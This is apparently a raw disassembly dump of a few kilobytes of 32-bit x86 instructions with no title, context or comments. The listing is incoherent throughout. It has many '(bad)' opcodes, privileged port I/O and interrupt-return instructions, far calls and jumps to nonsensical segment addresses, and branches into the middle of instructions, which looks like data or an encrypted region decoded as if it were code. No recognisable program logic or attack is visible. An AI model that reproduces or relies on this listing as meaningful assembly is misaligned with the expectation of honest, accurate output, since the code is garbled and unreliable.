  41fad8:	jecxz  0x41fad1
  41fada:	repnz sub DWORD PTR [ecx-0x47673f7e],esi
  41fae1:	cdq    
  41fae2:	xor    DWORD PTR [ebx],eax
  41fae4:	mov    esp,0x723fa7f3
  41fae9:	bnd jmp 0x41faeb
  41faec:	gs xchg ecx,eax
  41faee:	psubsw mm7,mm0
  41faf1:	push   eax
  41faf2:	add    al,0xc0
  41faf4:	rcl    edi,0x7e
  41faf7:	jbe    0x41fad5
  41faf9:	aas    
  41fafa:	pop    ecx
  41fafb:	sti    
  41fafc:	mov    esp,0xc3acff84
  41fb01:	iret   
  41fb02:	js     0x41fb4e
  41fb04:	fld    QWORD PTR [ecx+edx*1+0x19e57959]
  41fb0b:	daa    
  41fb0c:	retf   0x132b
  41fb0f:	outs   dx,BYTE PTR ds:[esi]
  41fb10:	jecxz  0x41faff
  41fb12:	add    dl,BYTE PTR [ebx-0x3]
  41fb15:	sbb    al,0xda
  41fb17:	pop    edx
  41fb18:	addr16 mov ds:0x8ed2,al
  41fb1c:	call   0x464a:0x793b4142
  41fb23:	add    BYTE PTR [ebx+ecx*1+0x85bebda],dl
  41fb2a:	dec    ebp
  41fb2b:	mov    WORD PTR [edi+0x61],ss
  41fb2e:	ins    DWORD PTR es:[edi],dx
  41fb2f:	jno    0x41fb01
  41fb31:	or     eax,0x3d5d8722
  41fb36:	cmp    edx,DWORD PTR es:[esp+ecx*2+0x79170a23]
  41fb3e:	dec    eax
  41fb3f:	clc    
  41fb40:	push   eax
  41fb41:	or     BYTE PTR [eax+0x20],bl
  41fb44:	jnp    0x41fb72
  41fb46:	or     eax,0xfa1e552a
  41fb4b:	push   ss
  41fb4c:	out    0x24,al
  41fb4e:	retf   
  41fb4f:	jecxz  0x41fb4f
  41fb51:	sahf   
  41fb52:	and    DWORD PTR [eax-0x535e31cc],ebx
  41fb58:	fwait
  41fb59:	cdq    
  41fb5a:	sbb    BYTE PTR [eax+0xe],bh
  41fb5d:	lods   al,BYTE PTR ds:[esi]
  41fb5e:	iret   
  41fb5f:	mov    WORD PTR [ebx+0x20cdcb30],?
  41fb65:	mov    bh,0xed
  41fb67:	mov    ch,0xf5
  41fb69:	jp     0x41fbd2
  41fb6b:	cmp    ebx,esp
  41fb6d:	js     0x41fb53
  41fb6f:	int3   
  41fb70:	xchg   edx,eax
  41fb71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb72:	jns    0x41fb3c
  41fb74:	push   ebx
  41fb75:	(bad)  
  41fb76:	outs   dx,BYTE PTR ds:[esi]
  41fb77:	popf   
  41fb78:	jnp    0x41fb8c
  41fb7a:	repnz add al,0xb
  41fb7d:	out    dx,eax
  41fb7e:	fst    QWORD PTR [eax-0x58]
  41fb81:	mov    eax,esi
  41fb83:	xor    bl,BYTE PTR [edi+edi*4-0x21b247b]
  41fb8a:	mov    bl,0xdc
  41fb8c:	sub    esi,0xffffff86
  41fb8f:	jmp    0x17b8b1da
  41fb94:	pop    eax
  41fb95:	into   
  41fb96:	call   0x32bfe198
  41fb9b:	jecxz  0x41fbb4
  41fb9d:	jns    0x41fbd4
  41fb9f:	out    0x42,eax
  41fba1:	rol    BYTE PTR [edx-0x66],1
  41fba4:	xchg   ecx,eax
  41fba5:	inc    edi
  41fba6:	popa   
  41fba7:	or     al,0x7d
  41fba9:	sub    BYTE PTR [ebp+0x1e],cl
  41fbac:	and    eax,DWORD PTR [edx+0x9ba340f]
  41fbb2:	add    edx,DWORD PTR [ebx+0x409463e8]
  41fbb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbb9:	nop
  41fbba:	aaa    
  41fbbb:	sub    BYTE PTR [ecx],0x16
  41fbbe:	xor    al,0x12
  41fbc0:	test   al,0xd6
  41fbc2:	jne    0x41fb96
  41fbc4:	mov    ss,WORD PTR [edx+0x5a]
  41fbc7:	adc    ecx,edi
  41fbc9:	xchg   ecx,eax
  41fbca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbcb:	xor    eax,0xf54def0b
  41fbd0:	test   eax,0x14dc6e8b
  41fbd5:	outs   dx,BYTE PTR ds:[esi]
  41fbd6:	sti    
  41fbd7:	pop    esi
  41fbd8:	and    ah,BYTE PTR [ecx+0x483be345]
  41fbde:	imul   eax,esp,0x2f
  41fbe1:	push   edx
  41fbe2:	add    BYTE PTR [edi+0x780ee2f3],ch
  41fbe8:	mov    bh,0xf9
  41fbea:	nop
  41fbeb:	mov    cs,WORD PTR [edi]
  41fbed:	lds    eax,FWORD PTR [eax+ebx*1]
  41fbf0:	ins    BYTE PTR es:[edi],dx
  41fbf1:	(bad)  
  41fbf2:	fimul  DWORD PTR [edi]
  41fbf4:	push   esi
  41fbf5:	imul   ecx,esi,0x2e3c8923
  41fbfb:	lods   al,BYTE PTR ds:[esi]
  41fbfc:	jae    0x41fc1e
  41fbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbff:	jne    0x41fba1
  41fc01:	js     0x41fbfc
  41fc03:	inc    esp
  41fc04:	retf   
  41fc05:	add    bl,BYTE PTR [eax-0x1e]
  41fc08:	push   ebx
  41fc09:	pop    edx
  41fc0a:	xor    BYTE PTR [eax+0x5a6c57d7],cl
  41fc10:	jo     0x41fb9a
  41fc12:	int3   
  41fc13:	sub    al,0x4e
  41fc15:	jns    0x41fc33
  41fc17:	mov    edx,0xe91810a7
  41fc1c:	or     ebx,eax
  41fc1e:	ss push ebx
  41fc20:	std    
  41fc21:	and    DWORD PTR [esi+0x13349c8f],esi
  41fc27:	adc    eax,0xd0325527
  41fc2c:	test   cl,ah
  41fc2e:	sbb    DWORD PTR [ebp+0x54],0x6349f049
  41fc35:	ins    BYTE PTR es:[edi],dx
  41fc36:	aas    
  41fc37:	add    bh,bl
  41fc39:	je     0x41fbcd
  41fc3b:	shl    DWORD PTR [eax],0x8d
  41fc3e:	int    0x38
  41fc40:	retf   
  41fc41:	jb     0x41fbe9
  41fc43:	adc    al,0x49
  41fc45:	and    DWORD PTR [edx+ebx*4+0x18],eax
  41fc49:	fld    DWORD PTR [ebp+0x36762385]
  41fc50:	cmp    DWORD PTR [ebp+esi*4+0x36ae88d9],esp
  41fc57:	jne    0x41fc8d
  41fc59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc5a:	fcom   st(6)
  41fc5c:	push   edx
  41fc5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc5e:	es jl  0x41fc4a
  41fc61:	push   0xfffffff5
  41fc63:	aam    0x8c
  41fc65:	cmp    eax,0x9b434749
  41fc6a:	sar    ah,cl
  41fc6c:	inc    esp
  41fc6d:	std    
  41fc6e:	les    ebp,FWORD PTR cs:[edx-0x72ea1ee9]
  41fc75:	cs pop edx
  41fc77:	dec    esp
  41fc78:	cmp    DWORD PTR [edi+ebx*4-0x1a],ecx
  41fc7c:	jbe    0x41fc30
  41fc7e:	adc    eax,0x6eac6686
  41fc83:	mov    DWORD PTR [edi-0x20c82433],esi
  41fc89:	stc    
  41fc8a:	fisubr WORD PTR [ebx]
  41fc8c:	lds    edx,FWORD PTR [esi+eiz*8+0x3e]
  41fc90:	test   eax,0xa81cbbe2
  41fc95:	and    ch,BYTE PTR [edi+eax*1-0x3a]
  41fc99:	in     al,0xc2
  41fc9b:	cmp    esi,0x4968d29e
  41fca1:	into   
  41fca2:	retf   
  41fca3:	xor    BYTE PTR ds:0x8543c83d,cl
  41fca9:	or     DWORD PTR [ecx-0xd73eaf4],0x9ff64c09
  41fcb3:	out    dx,eax
  41fcb4:	inc    ebx
  41fcb5:	test   eax,0xe6485e46
  41fcba:	in     eax,0xca
  41fcbc:	imul   eax,DWORD PTR [esp+ebx*8],0x344cc238
  41fcc3:	mov    ebx,0x9788e68d
  41fcc8:	fbld   TBYTE PTR [eax]
  41fcca:	push   esp
  41fccb:	or     ecx,DWORD PTR [edx]
  41fccd:	mov    dl,0x51
  41fccf:	inc    ebp
  41fcd0:	daa    
  41fcd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcd2:	sub    al,0xa
  41fcd4:	xor    BYTE PTR [eax],0x51
  41fcd7:	leave  
  41fcd8:	leave  
  41fcd9:	cmp    edi,DWORD PTR [edi+0x14]
  41fcdc:	clc    
  41fcdd:	ss pop ds
  41fcdf:	ret    0xa1f1
  41fce2:	and    BYTE PTR [eax],al
  41fce4:	push   DWORD PTR [ebp+edi*8-0x35]
  41fce8:	pop    esi
  41fce9:	nop
  41fcea:	mov    ?,WORD PTR [edx+edx*2]
  41fced:	push   esp
  41fcee:	bound  ebx,QWORD PTR [eax-0x226cc9c5]
  41fcf4:	pop    edi
  41fcf5:	int    0xcb
  41fcf7:	add    eax,0x40ccfd83
  41fcfc:	sub    al,0x77
  41fcfe:	adc    DWORD PTR [eax-0x1c],0x764d811d
  41fd05:	xchg   edi,eax
  41fd06:	or     dh,BYTE PTR [ebx+eiz*2]
  41fd09:	push   es
  41fd0a:	inc    ebp
  41fd0b:	popf   
  41fd0c:	adc    DWORD PTR [ebp-0x56],0x2c5004e7
  41fd13:	push   0x8191206d
  41fd18:	mov    dl,0x9
  41fd1a:	adc    DWORD PTR [edx],ecx
  41fd1c:	sbb    dl,BYTE PTR [eax]
  41fd1e:	ins    DWORD PTR es:[edi],dx
  41fd1f:	xor    ecx,DWORD PTR [eax+eiz*4-0x21]
  41fd23:	add    DWORD PTR [ecx+0xf],0xffffff9b
  41fd27:	sub    eax,0x26e6c0a7
  41fd2c:	dec    eax
  41fd2d:	pop    edi
  41fd2e:	cmp    DWORD PTR [ebx+0x5361eee7],ebx
  41fd34:	jl     0x41fcdb
  41fd36:	mov    BYTE PTR [eax+ebx*1+0x48],al
  41fd3a:	mov    BYTE PTR [edx-0x64],al
  41fd3d:	jns    0x41fcf5
  41fd3f:	das    
  41fd40:	mov    eax,ds:0xad854740
  41fd45:	sbb    BYTE PTR [esi+ebx*2-0x4869b6ff],dl
  41fd4c:	and    al,0x83
  41fd4e:	fsubr  QWORD PTR [ebx-0x66d1d0d3]
  41fd54:	ins    BYTE PTR es:[edi],dx
  41fd55:	xor    al,BYTE PTR [edi]
  41fd57:	nop
  41fd58:	imul   ebp,DWORD PTR [esi-0x25],0xffffff99
  41fd5c:	dec    eax
  41fd5d:	in     eax,0x85
  41fd5f:	dec    ecx
  41fd60:	fs cmp ebx,esi
  41fd63:	pop    ebx
  41fd64:	out    0x33,al
  41fd66:	xchg   edi,eax
  41fd67:	mov    ebx,0xd0564085
  41fd6c:	xchg   edx,eax
  41fd6d:	imul   edi,DWORD PTR [ebx],0x37
  41fd70:	dec    edx
  41fd71:	and    esi,DWORD PTR [ecx+0xf6c397f]
  41fd77:	add    al,0xa3
  41fd79:	xchg   ebp,eax
  41fd7a:	in     eax,dx
  41fd7b:	xchg   ecx,eax
  41fd7c:	in     eax,0xe6
  41fd7e:	or     ah,0x85
  41fd81:	(bad)  [eax-0x69bd8ecd]
  41fd87:	in     al,0x82
  41fd89:	les    ebp,FWORD PTR [ebp+0x6892900f]
  41fd8f:	in     eax,0x30
  41fd91:	push   ebp
  41fd92:	sub    BYTE PTR [esi+0x6cce8393],ah
  41fd98:	push   esp
  41fd99:	enter  0xbb30,0xd4
  41fd9d:	add    eax,0x5e98644
  41fda2:	cli    
  41fda3:	pop    ebx
  41fda4:	scas   eax,DWORD PTR es:[edi]
  41fda5:	mov    edi,0xafb0b09
  41fdaa:	stos   BYTE PTR es:[edi],al
  41fdab:	arpl   WORD PTR [esi-0x25],ax
  41fdae:	sbb    ecx,DWORD PTR [ebp+0x2f]
  41fdb1:	mov    DWORD PTR [eax-0x12],ebp
  41fdb4:	and    DWORD PTR es:[eax-0x1a1cb98b],eax
  41fdbb:	add    BYTE PTR [edx],0x1c
  41fdbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdbf:	xchg   ebp,eax
  41fdc0:	cmp    edi,esp
  41fdc2:	cdq    
  41fdc3:	ja     0x41fdda
  41fdc5:	cmp    al,BYTE PTR [ecx+0x39]
  41fdc8:	add    al,BYTE PTR [ebx-0x2a]
  41fdcb:	cmp    al,0x2
  41fdcd:	scas   eax,DWORD PTR es:[edi]
  41fdce:	mov    cl,0xf1
  41fdd0:	and    ecx,DWORD PTR [ebp+0x43f0ff27]
  41fdd6:	loope  0x41fd9d
  41fdd8:	cldemote BYTE PTR [ecx]
  41fddb:	sbb    al,0x3d
  41fddd:	(bad)  
  41fdde:	in     eax,dx
  41fddf:	(bad)  
  41fde0:	cli    
  41fde1:	jg     0x41fddf
  41fde3:	dec    ebx
  41fde4:	aas    
  41fde5:	jmp    0x45da:0x3e2c0f19
  41fdec:	or     eax,0x275b2716
  41fdf1:	xchg   edi,eax
  41fdf2:	adc    BYTE PTR [eax+0x2],ah
  41fdf5:	sub    dh,BYTE PTR [esp+ecx*8]
  41fdf8:	addr16 mov ah,0xa8
  41fdfb:	jl     0x41fe0c
  41fdfd:	push   es
  41fdfe:	add    bh,BYTE PTR [edx]
  41fe00:	(bad)  
  41fe02:	push   ebp
  41fe03:	outs   dx,DWORD PTR ds:[esi]
  41fe04:	mov    dh,0x1c
  41fe06:	or     cl,BYTE PTR [eax+0x200d90aa]
  41fe0c:	out    dx,al
  41fe0d:	inc    ecx
  41fe0e:	xchg   ecx,eax
  41fe0f:	cmp    al,0x8f
  41fe11:	cmp    ecx,DWORD PTR [esi+0x75]
  41fe14:	inc    ebx
  41fe15:	or     ebx,edi
  41fe17:	clc    
  41fe18:	add    BYTE PTR [edx],dh
  41fe1a:	repnz retf 0xb93a
  41fe1e:	in     eax,0x20
  41fe20:	push   es
  41fe21:	aas    
  41fe22:	add    DWORD PTR [ebp+0x0],edx
  41fe25:	dec    esp
  41fe26:	pop    edx
  41fe27:	test   al,0x34
  41fe29:	mov    DWORD PTR [eax-0x3f589bc4],0xe48f86e6
  41fe33:	das    
  41fe34:	fs jns 0x41fde5
  41fe37:	ror    DWORD PTR [eax+0x45],0x63
  41fe3b:	call   0xde99:0xcb24d743
  41fe42:	in     eax,dx
  41fe43:	mov    ebx,DWORD PTR [eax]
  41fe45:	sbb    ch,ch
  41fe47:	sub    eax,0x9b485e9b
  41fe4c:	xor    DWORD PTR [ecx-0x2fd8a351],edi
  41fe52:	cld    
  41fe53:	aad    0x86
  41fe55:	sbb    DWORD PTR [edx+0x6604460e],eax
  41fe5b:	xchg   ch,ch
  41fe5d:	pop    esi
  41fe5e:	add    ebx,eax
  41fe60:	push   ss
  41fe61:	pushw  ss
  41fe63:	cmp    eax,ecx
  41fe65:	cmp    eax,0x1cb505c8
  41fe6a:	and    dl,BYTE PTR [esp+edx*4+0x3b]
  41fe6e:	leave  
  41fe6f:	retf   0xdf39
  41fe72:	retf   
  41fe73:	cmp    eax,0x873192f4
  41fe78:	inc    ecx
  41fe79:	jne    0x41fe51
  41fe7b:	jl     0x41feed
  41fe7d:	mov    BYTE PTR [ecx],0xd8
  41fe80:	mov    ds:0x7d08df2c,al
  41fe85:	jmp    0x41fe68
  41fe87:	ja     0x41fe57
  41fe89:	repz pushf 
  41fe8b:	jne    0x41fe84
  41fe8d:	xchg   ebp,eax
  41fe8e:	scas   al,BYTE PTR es:[edi]
  41fe8f:	mov    cl,0x17
  41fe91:	and    DWORD PTR [ebx-0x33],0xe8979500
  41fe98:	mov    ds:0x6509fa9c,al
  41fe9d:	mov    dl,0x40
  41fe9f:	jge    0x41ff0e
  41fea1:	repz dec ebx
  41fea3:	push   ecx
  41fea4:	dec    edi
  41fea5:	push   eax
  41fea6:	sub    BYTE PTR [eax-0x3e],0x30
  41feaa:	mov    bl,0x11
  41feac:	add    ch,BYTE PTR [esi-0x62]
  41feaf:	mov    DWORD PTR [eax-0x78ef9aac],esp
  41feb5:	inc    ebp
  41feb6:	push   ebp
  41feb7:	jle    0x41ff27
  41feb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feba:	mov    ecx,0x545dd5a
  41febf:	sub    BYTE PTR [edi],al
  41fec1:	dec    ebp
  41fec2:	mov    ebp,0x11524822
  41fec7:	add    bh,ah
  41fec9:	movsx  ebp,WORD PTR [edi]
  41fecc:	sbb    DWORD PTR [esi+edx*2],esi
  41fecf:	and    DWORD PTR [edi+0x7c7c07c],0x7786002e
  41fed9:	inc    esi
  41fedb:	daa    
  41fedc:	mov    ecx,ecx
  41fede:	shl    DWORD PTR [ebp+0x55],0x74
  41fee2:	cwde   
  41fee3:	inc    ebx
  41fee4:	push   ss
  41fee5:	pop    ecx
  41fee6:	sbb    BYTE PTR [edi-0x60],dl
  41fee9:	ins    DWORD PTR es:[edi],dx
  41feea:	dec    esp
  41feeb:	fisub  WORD PTR [eax+0x42]
  41feee:	push   ss
  41feef:	(bad)  
  41fef0:	int    0xa8
  41fef2:	add    cl,BYTE PTR [ebx+0x48c4d202]
  41fef8:	ins    DWORD PTR es:[edi],dx
  41fef9:	jae    0x41ff2a
  41fefb:	sub    ebx,DWORD PTR [ecx+0x21021c9d]
  41ff01:	loop   0x41fec5
  41ff03:	add    al,0x64
  41ff05:	xchg   DWORD PTR [edx-0x4d],ebx
  41ff08:	clc    
  41ff09:	xchg   edx,eax
  41ff0a:	in     eax,dx
  41ff0b:	xchg   ebp,eax
  41ff0c:	push   0xffffffad
  41ff0e:	xor    BYTE PTR [eax],bl
  41ff10:	ret    0x70d0
  41ff13:	arpl   WORD PTR [edx+ebx*2-0x71],bp
  41ff17:	mov    esi,esi
  41ff19:	adc    eax,0xe81c3a6d
  41ff1e:	mov    cl,0xf9
  41ff20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff21:	dec    eax
  41ff22:	and    al,0xf3
  41ff24:	hlt    
  41ff25:	(bad)  
  41ff26:	clc    
  41ff27:	push   es
  41ff28:	in     al,dx
  41ff29:	jnp    0x41ff54
  41ff2b:	in     al,dx
  41ff2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff2d:	xchg   ebx,eax
  41ff2e:	ss dec esp
  41ff30:	out    0xcc,eax
  41ff32:	test   DWORD PTR [ebp+0x6b],ebp
  41ff35:	outs   dx,BYTE PTR ds:[esi]
  41ff36:	int3   
  41ff37:	add    dl,BYTE PTR [edi+0xb]
  41ff3a:	dec    ebx
  41ff3b:	add    ecx,DWORD PTR [ebx-0x65]
  41ff3e:	cmp    DWORD PTR [edi+0x7cb399a3],eax
  41ff44:	ds in  al,0x59
  41ff47:	adc    ah,BYTE PTR [ebp-0x6f241870]
  41ff4d:	lahf   
  41ff4e:	inc    ecx
  41ff4f:	and    eax,0xdac0422
  41ff54:	in     eax,dx
  41ff55:	cwde   
  41ff56:	cmp    DWORD PTR [ebx],esp
  41ff58:	push   cs
  41ff59:	sub    al,0x99
  41ff5b:	imul   eax,DWORD PTR [edi+0x1f],0xffffffa5
  41ff5f:	ret    0x8e94
  41ff62:	xor    BYTE PTR [ecx+ebp*4-0x69f39944],dh
  41ff69:	sub    DWORD PTR [ebx+eiz*4],ecx
  41ff6c:	mov    eax,0x957b309a
  41ff71:	clc    
  41ff72:	leave  
  41ff73:	mov    ds:0x2db1f20c,eax
  41ff78:	inc    esp
  41ff79:	adc    ah,BYTE PTR [esi]
  41ff7b:	retf   0x531c
  41ff7e:	ror    DWORD PTR [ebp+ecx*2-0x75dd21e8],0x2c
  41ff86:	xlat   BYTE PTR ds:[ebx]
  41ff87:	enter  0x4f32,0x12
  41ff8b:	push   ecx
  41ff8c:	jno    0x420009
  41ff8e:	icebp  
  41ff8f:	mov    DWORD PTR [ecx],ebp
  41ff91:	es inc ebp
  41ff93:	popa   
  41ff94:	(bad)
  41ff97:	pop    es
  41ff98:	imul   esi,DWORD PTR [eax+edi*2-0xaf4a19f],0xd127c491
  41ffa3:	out    0xf2,al
  41ffa5:	or     al,0x11
  41ffa7:	scas   al,BYTE PTR es:[edi]
  41ffa8:	inc    esi
  41ffa9:	sub    BYTE PTR [ebx+0x3b],bl
  41ffac:	pop    edi
  41ffad:	pop    esi
  41ffae:	dec    ebp
  41ffaf:	adc    BYTE PTR [esp+ebx*2+0x7815ce6b],ch
  41ffb6:	xor    ah,BYTE PTR [edx-0x5afaa374]
  41ffbc:	shl    bl,0xe2
  41ffbf:	push   0xfcbfadf8
  41ffc4:	gs loopne 0x420046
  41ffc7:	loop   0x41ffcc
  41ffc9:	ds ds jo 0x41ffce
  41ffcd:	mov    al,ds:0x18bed78e
  41ffd2:	clc    
  41ffd3:	mov    DWORD PTR [esi+0x56],esp
  41ffd6:	rcl    BYTE PTR [ebx-0x136cc61b],1
  41ffdc:	cmp    BYTE PTR [ecx-0x14],bl
  41ffdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffe0:	lahf   
  41ffe1:	sub    ah,BYTE PTR [edi]
  41ffe3:	push   0x65
  41ffe5:	and    al,0xea
  41ffe7:	dec    eax
  41ffe8:	(bad)  
  41ffe9:	pusha  
  41ffea:	aas    
  41ffeb:	xlat   BYTE PTR ds:[ebx]
  41ffec:	push   edx
  41ffed:	(bad)  
  41ffee:	out    dx,al
  41ffef:	xor    al,0xc2
  41fff1:	ret    0x244d
  41fff4:	rol    DWORD PTR [ebx],1
  41fff6:	rol    BYTE PTR [edx-0x4f3c55de],1
  41fffc:	add    DWORD PTR [ecx-0x60],ebx
  41ffff:	sbb    eax,DWORD PTR [esi+edx*1+0x140e640c]
  420006:	and    al,0xa6
  420008:	fcmovne st,st(5)
  42000a:	shl    BYTE PTR [ebx],0x9a
  42000d:	jne    0x41fff7
  42000f:	inc    eax
  420010:	imul   ecx,DWORD PTR [eax+edx*4-0x45bf7dcf],0x601e78e2
  42001b:	pop    edx
  42001c:	inc    ebx
  42001d:	inc    ebp
  42001e:	xchg   ecx,eax
  42001f:	adc    edx,DWORD PTR [esi+0x73]
  420022:	xor    al,0x93
  420024:	fwait
  420025:	add    BYTE PTR [ebx-0x13],ah
  420028:	push   0x2fe1abf3
  42002d:	jl     0x41ffe3
  42002f:	mov    ecx,0x66e5f421
  420034:	mov    ecx,0x32d84309
  420039:	pop    edx
  42003a:	repz sahf 
  42003c:	sub    DWORD PTR [edx-0x4d],ebx
  42003f:	mov    edx,0xa7b946e1
  420044:	mov    ebx,0x2fa49635
  420049:	sub    ebx,DWORD PTR [eax]
  42004b:	icebp  
  42004c:	mov    eax,ds:0x68ac108c
  420051:	cmp    eax,0xe22ef0d1
  420056:	xor    ah,BYTE PTR [ebx+0x72]
  420059:	ret    
  42005a:	jns    0x42003e
  42005c:	add    esi,DWORD PTR [ecx-0x33]
  42005f:	add    eax,0x4c964fc8
  420064:	dec    edx
  420065:	jmp    0x420036
  420067:	leave  
  420068:	hlt    
  420069:	sbb    BYTE PTR [esi-0x7c],al
  42006c:	pop    DWORD PTR [ebx+0x4e984da]
  420072:	popa   
  420073:	fmul   st,st(0)
  420075:	dec    eax
  420076:	xchg   esi,eax
  420077:	mov    edi,0x14221c8b
  42007c:	sub    eax,0xb19a5412
  420081:	arpl   di,sp
  420083:	pop    edx
  420084:	iret   
  420085:	xor    ebx,DWORD PTR [ebx+0x7e]
  420088:	xchg   ebx,eax
  420089:	pop    ss
  42008a:	stc    
  42008b:	adc    al,0x8c
  42008d:	push   edi
  42008e:	fild   QWORD PTR [ebx]
  420090:	inc    edx
  420091:	pop    eax
  420092:	xlat   BYTE PTR ds:[ebx]
  420093:	int3   
  420094:	das    
  420095:	adc    ebx,DWORD PTR [esi-0x5a38193b]
  42009b:	sbb    DWORD PTR [ecx-0x6a],edi
  42009e:	mov    DWORD PTR [edx],ecx
  4200a0:	pop    eax
  4200a1:	ror    BYTE PTR [ebx-0x4f],cl
  4200a4:	push   ebp
  4200a5:	xor    DWORD PTR [esi],0xac98effe
  4200ab:	xor    ah,BYTE PTR [esi]
  4200ad:	and    eax,0x5cf9c288
  4200b2:	out    0x2b,al
  4200b4:	inc    ebx
  4200b5:	pop    ebp
  4200b7:	push   edi
  4200b8:	icebp  
  4200b9:	(bad)  
  4200ba:	repnz and DWORD PTR [eax],ecx
  4200bd:	add    ch,dh
  4200bf:	dec    edi
  4200c0:	aas    
  4200c1:	in     eax,0x7b
  4200c3:	ja     0x420131
  4200c5:	std    
  4200c6:	lods   eax,DWORD PTR ds:[esi]
  4200c7:	jg     0x420096
  4200c9:	(bad)  
  4200ca:	ss push ecx
  4200cd:	outs   dx,DWORD PTR ds:[esi]
  4200ce:	push   ebp
  4200cf:	mov    ds:0xd0aa4fdd,al
  4200d4:	jns    0x42008e
  4200d6:	add    al,0xcc
  4200d8:	inc    ebp
  4200d9:	mov    bl,0x39
  4200db:	pop    edx
  4200dc:	push   esp
  4200dd:	sbb    dh,al
  4200df:	(bad)  
  4200e0:	std    
  4200e1:	mov    dl,BYTE PTR [edi-0x687f4128]
  4200e7:	jmp    FWORD PTR [esi+0x35]
  4200ea:	(bad)  
  4200eb:	jecxz  0x420138
  4200ed:	adc    BYTE PTR [eax],cl
  4200ef:	daa    
  4200f0:	add    ah,BYTE PTR ds:0x76c79bed
  4200f6:	and    ebp,ebp
  4200f8:	in     al,0xcf
  4200fa:	mov    ch,0x61
  4200fc:	scas   al,BYTE PTR es:[edi]
  4200fd:	inc    esp
  4200fe:	(bad)  
  420100:	jno    0x4200ac
  420102:	adc    DWORD PTR [ecx-0x6b6f59cc],eax
  420108:	rcr    al,cl
  42010a:	xor    BYTE PTR [esi+0x7fb6cf8c],dh
  420110:	repnz dec esp
  420112:	xchg   BYTE PTR [eax+0x27246d31],bl
  420118:	and    BYTE PTR [eax],cl
  42011a:	int3   
  42011b:	xor    eax,0x18689d92
  420120:	ins    DWORD PTR es:[edi],dx
  420121:	add    al,0x15
  420123:	js     0x4200bf
  420125:	mov    BYTE PTR [edx-0x25c58942],dl
  42012b:	fadd   QWORD PTR [eax]
  42012d:	sbb    BYTE PTR [ecx],cl
  42012f:	ret    
  420130:	(bad)  
  420132:	xchg   DWORD PTR [eax+0x16cc4c6b],edx
  420138:	xlat   BYTE PTR ds:[ebx]
  420139:	xchg   BYTE PTR [ecx-0x6522595c],cl
  42013f:	add    ch,BYTE PTR [esi+0x388c5206]
  420145:	test   al,0x5c
  420147:	addr16 pusha 
  420149:	xchg   esi,eax
  42014a:	jmp    0x30d3d863
  42014f:	call   0x8113:0xf6ae9cd1
  420156:	and    ebx,esi
  420158:	imul   ecx,ebp,0x32d7a532
  42015e:	xor    edx,DWORD PTR [eax+0x4213a25f]
  420164:	hlt    
  420165:	dec    ecx
  420166:	in     al,dx
  420167:	cwde   
  420168:	sbb    esp,esp
  42016a:	div    DWORD PTR [ecx+0x79f2751e]
  420170:	int3   
  420171:	enter  0x8251,0xa4
  420175:	adc    cl,BYTE PTR [ebx+0x33]
  420178:	adc    al,0x45
  42017a:	mov    ?,WORD PTR [esp+edx*1-0x47]
  42017e:	mov    ebx,db1
  420181:	jb     0x4201e2
  420183:	mov    WORD PTR [edi+eiz*8+0x523f45b6],?
  42018a:	das    
  42018b:	push   ecx
  42018c:	shl    BYTE PTR [ecx+0x7c],1
  42018f:	mov    edi,0xdb595e0c
  420194:	std    
  420195:	pop    ecx
  420196:	stos   BYTE PTR es:[edi],al
  420197:	(bad)  
  420198:	mov    WORD PTR [esi+esi*1+0x63],gs
  42019c:	call   0xff68c7e6
  4201a1:	mov    ecx,0x34accfed
  4201a6:	jl     0x42016d
  4201a8:	pop    es
  4201a9:	mov    al,ds:0xf200bf1c
  4201ae:	mov    bh,0x9
  4201b0:	ins    DWORD PTR es:[edi],dx
  4201b1:	fld    TBYTE PTR [eax+0x343d2894]
  4201b7:	popf   
  4201b8:	or     DWORD PTR fs:[ebx+edi*4],ecx
  4201bc:	push   ecx
  4201bd:	xor    edi,esi
  4201bf:	enter  0xdf4f,0xaa
  4201c3:	jmp    DWORD PTR [ecx+0x7c3b73f]
  4201c9:	js     0x420247
  4201cb:	mov    al,ds:0x4d2fc008
  4201d0:	fisttp WORD PTR [esi]
  4201d2:	xchg   ebx,eax
  4201d3:	mov    ds:0x2c05798f,eax
  4201d8:	mov    ah,0x1a
  4201da:	jmp    0x79e12dd7
  4201df:	fcom   DWORD PTR [edi*1+0x28b2f04b]
  4201e6:	cdq    
  4201e7:	xchg   BYTE PTR [ebp-0x6e],ch
  4201ea:	mov    ebp,0x66043996
  4201ef:	and    eax,DWORD PTR [edx+esi*4]
  4201f2:	sub    BYTE PTR [esi-0x3ba6dbdf],al
  4201f8:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4201fa:	or     al,0xb5
  4201fc:	xchg   esp,eax
  4201fd:	test   DWORD PTR [ebx],0x7b4852a0
  420203:	jp     0x420196
  420205:	mov    dl,0x4c
  420207:	dec    edi
  420208:	dec    eax
  420209:	call   0xff72:0x4e20d368
  420210:	inc    eax
  420211:	jmp    0x9520:0x8868043b
  420218:	lods   al,BYTE PTR ds:[esi]
  420219:	mov    bh,0xc
  42021b:	fwait
  42021c:	loope  0x420243
  42021e:	cmp    edx,ebp
  420220:	js     0x420208
  420222:	pop    ecx
  420223:	dec    ecx
  420224:	mov    bl,ch
  420226:	xor    al,0xd2
  420228:	repz (bad) 
  42022a:	leave  
  42022b:	pusha  
  42022c:	mov    ah,0x96
  42022e:	mov    al,ds:0xf4cc8019
  420233:	ret    0x31c7
  420236:	aaa    
  420237:	test   BYTE PTR [ecx],ah
  420239:	les    esp,FWORD PTR [ebx+0x3b5e4e0f]
  42023f:	in     al,0x8
  420241:	and    cl,bl
  420243:	push   ebx
  420244:	test   DWORD PTR [ebp-0x4606aaea],ebp
  42024a:	push   ds
  42024b:	mov    ecx,0x34cb20ef
  420250:	retf   0x6389
  420253:	lods   al,BYTE PTR ds:[esi]
